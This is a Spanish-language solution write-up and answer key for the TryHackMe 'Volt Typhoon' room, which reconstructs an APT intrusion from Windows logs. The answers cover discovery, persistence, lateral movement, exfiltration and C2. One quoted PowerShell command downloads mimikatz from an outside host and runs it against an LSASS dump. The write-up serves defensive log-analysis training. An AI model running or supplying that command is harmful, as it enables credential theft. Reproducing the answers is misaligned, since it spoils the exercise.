# Volt Typhoon

| **Dificultad** | Medium |
| **Tipo** | CTF |
| **Slug** | `volttyphoon` |
| **Link** | [TryHackMe](https://tryhackme.com/room/volttyphoon) |
| **Sección** | 02 Level Medium |
| **Fuente** | texto oficial THM + anotaciones propias |
| **Componentes** | APT / Volt Typhoon / Windows / discovery / persistence / credential access / data exfiltration |
| **Impacto** | Reconstruir una intrusión del APT Volt Typhoon a partir de logs de Windows (comandos, persistencia, exfiltración, lateral movement) |

---

**Contexto:** Sala basada en la intrusión del grupo APT Volt Typhoon. Se analizan logs de Windows para reconstruir: comportamiento inicial (timestamp, usuario), comandos de descubrimiento, persistencia, movimiento lateral, credenciales robadas (mimikatz) y exfiltración de datos.

## Solucionario

### Task 1: (Intro)

**Explicación:**

Introducción.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Intro) | `No answer needed` |

### Task 2: (Acceso inicial / Initial Access)

**Explicación:**

Acceso inicial: el timestamp es `2024-03-24T11:10:22` y el usuario implicado es `voltyp-admin`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Timestamp) | `1. 2024-03-24T11:10:22` |
| 2 | (User) | `2. voltyp-admin` |

### Task 3: (Descubrimiento / Discovery)

**Explicación:**

Descubrimiento: el comando de enumeración de discos es `wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename` y la contraseña descubierta es `d5ag0nm@5t3r`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Discovery command) | `1. wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename` |
| 2 | (Password) | `2. d5ag0nm@5t3r` |

### Task 4: (Persistencia / Persistence)

**Explicación:**

La carpeta de persistencia usada es `C:\Windows\Temp\`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Persistence folder) | `1. C:\Windows\Temp\` |

### Task 5: (Configuración del sistema / System Config)

**Explicación:**

Configuración del sistema: el cmdlet de PowerShell es `Remove-ItemProperty`, el archivo de imagen es `cl64.gif` y la clave de registro es `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Cmdlet) | `1. Remove-ItemProperty` |
| 2 | (Image file) | `2. cl64.gif` |
| 3 | (Registry key) | `3. HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control` |

### Task 6: (Credenciales / Credential Access)

**Explicación:**

Credenciales: las herramientas remoto de acceso son `OpenSSH, putty, realvnc`; el comando de descarga y ejecución de mimikatz es `Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Remote tools) | `1. OpenSSH, putty, realvnc` |
| 2 | (Mimikatz command) | `2. Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait` |

### Task 7: (Movimiento lateral / Lateral Movement)

**Explicación:**

Movimiento lateral: los IDs de evento de logon son `4624 4625 4769`; el archivo de reportes es `AuditReport.jspx`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Event IDs) | `1. 4624 4625 4769` |
| 2 | (Report file) | `2. AuditReport.jspx` |

### Task 8: (Exfiltración / Exfiltration)

**Explicación:**

Los archivos CSV exfiltrados son `2022.csv 2023.csv 2024.csv`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (CSV files) | `1. 2022.csv 2023.csv 2024.csv` |

### Task 9: (C2)

**Explicación:**

C2 y servidor de admin: la IP/puerto es `10.2.30.1 8443` y el nombre de la aplicación es `Application Security Setup System`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (C2 IP/port) | `1. 10.2.30.1 8443` |
| 2 | (App name) | `2. Application Security Setup System` |

---

**Metodología:**

1. Revisar el acceso inicial (timestamp y usuario `voltyp-admin`).
2. Analizar comandos de descubrimiento (wmic logicaldisk) y credenciales descubiertas.
3. Localizar persistencia en `C:\Windows\Temp\` y cambios de configuración del sistema (Remove-ItemProperty, cl64.gif).
4. Detectar acceso a credenciales (descarga/ejecución de mimikatz contra lsass.dmp).
5. Correlacionar eventos de logon (4624/4625/4769), reportes de movimiento lateral (AuditReport.jspx) y exfiltración de CSVs.
6. Identificar la infraestructura C2 (10.2.30.1:8443).

**Learning chain:** voltyp-admin -> wmic logicaldisk -> C:\Windows\Temp persistencia -> Remove-ItemProperty/cl64.gif -> mimikatz lsass.dmp -> 4624/4625/4769 -> AuditReport.jspx -> 2022/2023/2024.csv exfil -> C2 10.2.30.1:8443

**Lección:** *El grupo APT Volt Typhoon combina credenciales robadas (network devices), persistencia vía archivos ocultos en temporales y herramientas de acceso remoto legítimas (SSH/putty/VNC) para moverse lateralmente y exfiltrar datos de forma "living off the land".*

**MITRE ATT&CK:** T1083 (File and Directory Discovery) · T1003.001 (LSASS) · T1547 (Boot or Logon Autostart) · T1021 (Remote Services) · T1041 (Exfiltration Over C2) · CWE-200 (Exposure of Sensitive Information)

**Fuente:** [TryHackMe - Volt Typhoon](https://tryhackme.com/room/volttyphoon)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
